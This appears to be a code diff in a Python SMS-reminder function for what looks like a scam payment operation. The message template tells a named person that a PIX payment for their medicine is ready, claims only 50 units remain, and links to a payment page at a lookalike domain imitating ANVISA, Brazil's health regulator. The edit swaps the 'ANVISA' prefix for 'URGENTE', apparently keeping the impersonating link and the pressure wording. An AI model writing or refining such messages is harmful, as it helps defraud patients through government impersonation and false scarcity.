@@ -345,7 +345,7 @@ def _send_reminder_sms_async(transaction_id, customer_data):
    
     try:
         # Message template for reminder with customer's first name and transaction ID
-        message = f"ANVISA: {first_name}, o PIX para seu Medicamento está pronto! Apenas 50 unidades disponíveis, reserve logo. Pague aqui:https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
+        message = f"URGENTE: {first_name}, o PIX para seu Medicamento está pronto! Apenas 50 unidades disponíveis, reserve logo. Pague aqui:https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}"
         
         logger.info(f"[PAYMENT_TRACKER][ASYNC] Sending reminder SMS to {phone_number} for transaction {transaction_id}")
         
